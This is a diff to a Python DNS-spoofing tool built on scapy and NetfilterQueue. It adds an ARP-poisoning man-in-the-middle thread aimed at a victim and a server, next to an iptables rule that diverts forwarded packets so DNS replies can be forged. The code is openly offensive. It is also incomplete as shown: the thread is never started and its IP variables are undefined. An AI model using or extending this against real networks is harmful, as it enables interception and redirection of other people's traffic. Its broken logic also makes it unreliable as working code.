@@ -1,8 +1,10 @@
 import os
 import logging as log
+import threading
+import ArpPoison
 from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
 from netfilterqueue import NetfilterQueue
- 
+
  
 class DnsSnoof:
     def __init__(self, hostDict, queueNum):
@@ -11,6 +13,9 @@ class DnsSnoof:
         self.queue = NetfilterQueue()
  
     def __call__(self):
+
+        arpPoison = threading.Thread(target = ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
+
         log.info("Snoofing....")
         os.system(
             f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
